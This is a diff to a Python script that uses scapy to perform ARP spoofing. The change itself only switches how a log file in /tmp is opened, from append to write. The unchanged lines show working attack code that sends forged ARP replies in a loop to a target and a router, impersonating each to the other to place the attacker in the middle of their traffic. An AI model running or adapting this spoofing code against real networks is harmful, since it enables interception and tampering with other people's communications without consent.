@@ -36,7 +36,7 @@ def get_mac(ip):
 def spoof(taget_ip, spoof_ip):
     target_mac = get_mac(taget_ip)
     if not target_mac:
-        with open('/tmp/net_fetch_arp.log', 'a', buffer_size) as f:
+        with open('/tmp/net_fetch_arp.log', 'w', buffer_size) as f:
             f.write("MAC not found")
     else:
         packet= scapy.ARP(op=2,pdst = taget_ip, hwdst=target_mac, psrc=spoof_ip)
@@ -55,7 +55,7 @@ def arp_try(target_ip, router_ip):
             spoof(target_ip, router_ip)
             spoof(router_ip, target_ip)
             packet_count = packet_count + 2
-            with open('/tmp/net_fetch_arp.log', 'a', buffer_size) as f:
+            with open('/tmp/net_fetch_arp.log', 'w', buffer_size) as f:
                 f.write("Packet send "+ str(packet_count)+"\n")
             time.sleep(2)
     except KeyboardInterrupt:
